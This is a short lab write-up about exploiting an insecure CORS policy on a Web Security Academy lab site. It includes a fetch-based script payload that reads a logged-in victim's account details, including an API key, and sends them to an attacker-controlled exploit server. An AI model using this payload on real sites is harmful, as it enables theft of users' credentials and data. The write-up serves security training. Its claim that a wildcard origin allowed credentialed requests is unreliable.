# CORS Exploitation with Fetch

## Lab Context
This lab demonstrated a **misconfigured CORS policy**, where the application trusted all origins (`Access-Control-Allow-Origin: *`).  
Because of this, I was able to craft a malicious payload that used the victim’s browser session to fetch sensitive data from the API.

<img width="1920" height="1080" alt="Screenshot From 2025-09-09 13-19-13" src="https://github.com/user-attachments/assets/a4e72421-ebfe-44cd-9166-ce36b338d977" />
---

## Vulnerability Summary
- **Type**: Security Misconfiguration → Insecure CORS  
- **Impact**: Allowed an attacker to steal sensitive information (API key) from authenticated users.  
- **Root Cause**: The server blindly trusted all origins and allowed cross-origin requests with user credentials.

---

## Exploit Payload
I used the `fetch` API to request sensitive data from the victim’s 
endpoint and exfiltrate it to my controlled server.

```html
<script>
fetch("https://victim-site.web-security-academy.net/accountDetails", {
  credentials: "include"
})
  .then(r => r.text())
  .then(data => fetch("https://my-exploit-server.net/log?key=" + encodeURIComponent(data)));
</script>

```
## References

[Medium Blog Post: How I Build Universal CORS Exploitation Payloads (with Fetch)](https://medium.com/@cybernerddd/b04d1c6705df)

[OWASP: Cross-Origin Resource Sharing (CORS)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)
